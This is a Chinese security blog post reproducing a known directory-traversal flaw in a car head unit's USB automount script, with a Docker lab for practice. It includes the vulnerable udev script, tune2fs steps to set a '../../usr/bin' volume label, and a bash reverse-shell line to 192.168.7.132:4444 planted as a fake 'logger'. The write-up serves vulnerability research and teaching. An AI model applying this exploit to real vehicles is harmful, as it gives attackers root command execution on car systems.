> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [delikely.github.io](https://delikely.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/)

> U 盘目录穿越获取车机 SHELL（含模拟环境）利用 U 盘 Getshell 是不是还停留在 Badusb、病毒 U 盘上，这次就来看一个不一样的。

[](#U盘目录穿越获取车机SHELL（含模拟环境） "U盘目录穿越获取车机SHELL（含模拟环境）")U 盘目录穿越获取车机 SHELL（含模拟环境）
----------------------------------------------------------------------------

利用 U 盘 Getshell 是不是还停留在 Badusb、病毒 U 盘上，这次就来看一个不一样的。

前段时间在浏览 Github 中看到了一个[日产车机破解](https://github.com/ea/bosch_headunit_root) 项目，其中有利用 U 盘获取车机 SHELL 的骚操作。感觉挺有意思的，花了点时间找到了车机固件，并复现了漏洞。顺手写了一个 Dockerfile 供大家一起玩耍。

### [](#目录穿越 "目录穿越")目录穿越

目录穿越大多发生在 WEB 中，没想到竟然还能出现在硬件设备中。

车机的操作系统为 Linux，U 盘等外设热插拔由 udev 实现。udev 是 Linux 内核的设备管理器，配置文件在 /etc/udev 下 。udev 会根据设备的 UUID 和 LABEL，构造挂载点。UUID 是块设备的唯一标识符，LAEBL 是块设备的一个标签。

车机中自定义了 U 盘挂载脚本，在 udev 配置文件 `/etc/udev/rules.d/local.rules` 中指定 block 设备由脚本 `/etc/udev/scripts/mount.sh`处理。

```
SUBSYSTEM=="block", ACTION=="add",    KERNEL=="sd*", ENV{ID_FS_TYPE}=="?*", \
		    ENV{DKD_PARTITION_TABLE}!="1", \
		    ENV{DKD_PRESENTATION_HIDE}!="1", \
		    RUN+="/etc/udev/scripts/mount.sh", RUN+="/etc/udev/scripts/trace_proxy.sh"
SUBSYSTEM=="block", ACTION=="remove", KERNEL=="sd*", ENV{ID_FS_TYPE}=="?*", RUN+="/etc/udev/scripts/mount.sh", RUN+="/etc/udev/scripts/trace_proxy.sh"
SUBSYSTEM=="block", ACTION=="change", KERNEL=="sd*", ENV{DEVTYPE}=="disk",  RUN+="/etc/udev/scripts/mount.sh"
```

问题就出现 mount.sh 脚本中，使用 `../../`可实现路径穿越，获取系统权限。

```
MOUNT="/bin/mount"
UMOUNT="/bin/umount"
MOUNTPT="/dev/media"
MOUNTDB="/tmp/.automount"

automount() {
    if [ -z "${ID_FS_TYPE}" ]; then
	logger -p user.err "mount.sh/automount" "$DEVNAME has no filesystem, not mounting"
	return
    fi

    
    
    if [ -n "${ID_FS_UUID}" ]; then
	mountdir=${ID_FS_UUID}
    elif [ -n "${ID_FS_LABEL}" ]; then
	mountdir=${ID_FS_LABEL}
    else
	mountdir="disk"
	while [ -d $MOUNTPT/$mountdir ]; do
	    mountdir="${mountdir}_"
	done
    fi

    
    ! test -d "$MOUNTPT/$mountdir" && mkdir -p "$MOUNTPT/$mountdir"

    
    if [ -n ${ID_FS_TYPE} ]
    then
      if [ "vfat" = ${ID_FS_TYPE} ]
      then
        IOCHARSET=",utf8=1"
      elif [ "ntfs" = ${ID_FS_TYPE} ]
      then
        IOCHARSET=",nls=utf8"
      fi
    fi

    result=$($MOUNT -t ${ID_FS_TYPE} -o sync,ro$IOCHARSET $DEVNAME "$MOUNTPT/$mountdir" 2>&1)
```

现在来详细看一下自动挂载函数 automount，首先判断 U 盘的文件系统 ID_FS_TYPE，可识别就继续执行，否则就退出。接下来的一段是用来拼接构造挂载点的，首先判断设备的 UUID，然后判断设备的 LABEL，哪一个不为空就用哪一个作为设备挂载的文件名，再拼接上 /dev/media 就是形成了最终的挂载点。最后使用 mount 命令将 U 盘挂载到刚才构造的这个路径上。

问题就出在挂载路径上，由于设备的 UUID 和 LABEL 都是能手动修改的。如果在 $mountdir 中引入相对路径，那就能实现路径穿越。然后通过路径穿越劫持系统中的程序，从而实现任意命令执行。UUID 中不能使用点号，所以就只能在 LABEL 上作文章了。接着往下看脚本。

```
status=$?
if [ ${status} -ne 0 ]; then
logger -p user.err "mount.sh/automount" "$MOUNT -t ${ID_FS_TYPE} -o sync,ro $DEVNAME \"$MOUNTPT/$mountdir\" failed: ${result}"
rm_dir "$MOUNTPT/$mountdir"
else
logger "mount.sh/automount" "mount [$MOUNTPT/$mountdir] with type ${ID_FS_TYPE} successful"
mkdir -p ${MOUNTDB}
echo -n "$MOUNTPT/$mountdir" > "${MOUNTDB}/$devname"
fi
```

U 盘挂载好之后，还会调用 logger 命令。那就骚操作就来了，将 UUID 设置为空，LABEL 设置为 `../usr/bin`就能劫持原来的 `/usr/bin/`下的应用程序。logger 是一个不错的选择，在其中写入命令。U 盘自动挂载时，就会自动执行。下面来看看具体怎么利用。

### [](#漏洞利用 "漏洞利用")漏洞利用

首先准备一个 EXT4 格式的 U 盘。

blkid 命令用于查看设备的 UUID、LABEL 等信息。为什么没有看到设备的 LABEL 呢？ 当某个属性为空时就会隐藏。

```
root@kali:~/automotive
/dev/sdb1: UUID="cf01cd66-7f32-4713-996a-3af878aba827" BLOCK_SIZE="4096" TYPE="ext4"
```

EXT4 格式的 U 盘默认状态下，只有 UUID，LABEL 为空。这两个值都可以使用 tune2fs 修改。

1.  置空 UUID
    
    ```
    root@kali:~/automotive
    tune2fs 1.46.2 (28-Feb-2021)
    Setting the UUID on this filesystem could take some time.
    Proceed anyway (or wait 5 seconds to proceed) ? (y,N) y
    ```
    
2.  设置 LABEL
    
    ```
    root@kali:~/automotive
    tune2fs 1.46.2 (28-Feb-2021)
    ```
    
    UUID 和 LABEL 修改完成，使用 blkid 查看修改后的结果，准确无误。
    
    ```
    root@kali:~/automotive
    /dev/sdc1: LABEL="../../usr/bin" BLOCK_SIZE="4096" TYPE="ext4"
    ```
    
3.  设置反弹 shell
    
    手动挂载 U 盘，在 U 盘中创建一个名为 logger 的 shell 脚本，内容为反弹 shell 。一切设置好之后移除 U 盘。
    
    ```
    root@kali:~/automotive
    root@kali:~/automotive
    root@kali:~/automotive
    root@kali:/media/root
    #!/bin/bash
    /bin/bash -i >& /dev/tcp/192.168.7.132/4444 0>&1
    root@kali:/media/root
    root@kali:/media/root
    root@kali:~/automotive
    ```
    
4.  将特制的 U 盘插入模拟车机
    
    手里并没有日产的车（PS. 我与 Tesla 漏洞就相距一台 Tesla），而此时手痒怎么办。幸好我找到了固件，搭建了一个模拟环境。
    
    下载之前制作好的 [Dockerfile](https://github.com/delikely/VulnerableFiles/blob/main/Automotive/bosch%20headunit%20root/Dockerfile)，然后使用 docker build、docker run 搭建起车机模拟环境。
    
    ```
    root@kali:~/automotive
    root@kali:~/automotive
    Sending build context to Docker daemon  86.02kB
    Step 1/4 : FROM ubuntu:12.04
     ---> 5b117edd0b76
    Step 2/4 : WORKDIR /etc/
     ---> Using cache
     ---> 22a68ab4c71d
    root@kali:~/automotive
    ee7059240fcea0e24bb01ebdbde51be1198f15b452af42f101307f8684
    ```
    
    使用上述命令创建好 Docker 后，虚拟车机就运行起来了。现在只需要插入之前准备好的 U 盘就能拿到反弹 Shell。
    
    ![](https://delikely.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/image-20210506220413173.png)
    
    注：由于劫持了 /usr/bin/ 目录，很多命令不能用了。若想使用，那就得提前准备，把原来 / usr/bin 目录的文件（或相同架构的可执行文件）拷贝到 U 盘根目录。
    

### [](#总结 "总结")总结

这个漏洞还挺有意思的，利用 U 盘 LABEL 目录遍历劫持 /usr/bin 执行任意命令。之前看过另外一个 [Ubuntu 提权漏洞](https://securitylab.github.com/research/Ubuntu-gdm3-accountsservice-LPE/)：利用软件链接提权，也让人直呼精彩。这次学到了新姿势，还搭建智能网联车漏洞的第一个模拟环境。后期会持续维护（新增）车联网漏洞模拟环境，欢迎有兴趣的小伙伴一起共建。

### [](#参考 "参考")参考

*   [bosch_headunit_root](https://github.com/ea/bosch_headunit_root)
*   [How to change filesystem UUID (2 same UUID)?](https://unix.stackexchange.com/questions/12858/how-to-change-filesystem-uuid-2-same-uuid)
*   [How to get root on Ubuntu 20.04 by pretending nobody’s /home](https://securitylab.github.com/research/Ubuntu-gdm3-accountsservice-LPE/)